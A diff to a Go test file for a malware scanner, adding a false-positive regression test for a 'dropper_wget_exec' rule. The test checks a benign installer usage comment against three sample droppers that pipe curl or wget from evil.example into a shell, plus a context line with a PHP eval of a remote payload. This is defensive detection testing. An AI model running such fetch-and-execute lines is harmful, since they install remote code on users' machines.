@@ -134,6 +134,64 @@ eval(file_get_contents('http://evil.example/payload.txt'));
 	}
 }
 
+// 2026-04-29 production FP: dropper_wget_exec fired on a distribution
+// installer that prints its own bootstrap "curl ... | sh" line in the
+// usage header. Same shape as rustup, helm, oh-my-zsh. The pattern is
+// inside a comment so it cannot execute. Code that actually pipes
+// curl/wget into a shell on a real shell line must keep firing.
+func TestDropperWgetExec_InstallerUsageComment(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	legit := []byte(`#!/usr/bin/env sh
+# example installer for Linux + macOS.
+#
+# Usage:
+#   curl -sSL https://example.com/install.sh | sh
+#   curl -sSL https://example.com/install.sh | sh -s -- --prefix ~/.local
+
+set -eu
+
+if command -v curl >/dev/null 2>&1; then
+    curl --fail --silent --show-error --location --output "$tmp" "$url"
+elif command -v wget >/dev/null 2>&1; then
+    wget --quiet --output-document="$tmp" "$url"
+fi
+`)
+	matches := scanner.ScanContent(legit, ".sh")
+	if hasRule(matches, "dropper_wget_exec") {
+		t.Error("dropper_wget_exec FP: matched curl|sh inside an installer usage comment")
+	}
+
+	// Real dropper: pattern in actual shell code, not a comment.
+	malicious := []byte(`#!/bin/sh
+curl -sSL http://evil.example/payload | bash
+`)
+	matches = scanner.ScanContent(malicious, ".sh")
+	if !hasRule(matches, "dropper_wget_exec") {
+		t.Error("dropper_wget_exec regression: real curl|bash dropper missed")
+	}
+
+	// Real dropper inline in an eval wrapper.
+	malicious2 := []byte(`#!/bin/sh
+eval "$(curl http://evil.example/x | sh)"
+`)
+	matches = scanner.ScanContent(malicious2, ".sh")
+	if !hasRule(matches, "dropper_wget_exec") {
+		t.Error("dropper_wget_exec regression: inline eval $(curl|sh) dropper missed")
+	}
+
+	// Indented dropper inside a function body.
+	malicious3 := []byte(`#!/bin/sh
+fetch() {
+    wget -qO- http://evil.example/x | sh
+}
+`)
+	matches = scanner.ScanContent(malicious3, ".sh")
+	if !hasRule(matches, "dropper_wget_exec") {
+		t.Error("dropper_wget_exec regression: indented wget|sh dropper missed")
+	}
+}
+
 func TestSpamWpOptionsInject_WPMLSitepress(t *testing.T) {
 	scanner := loadRepoScanner(t)
 
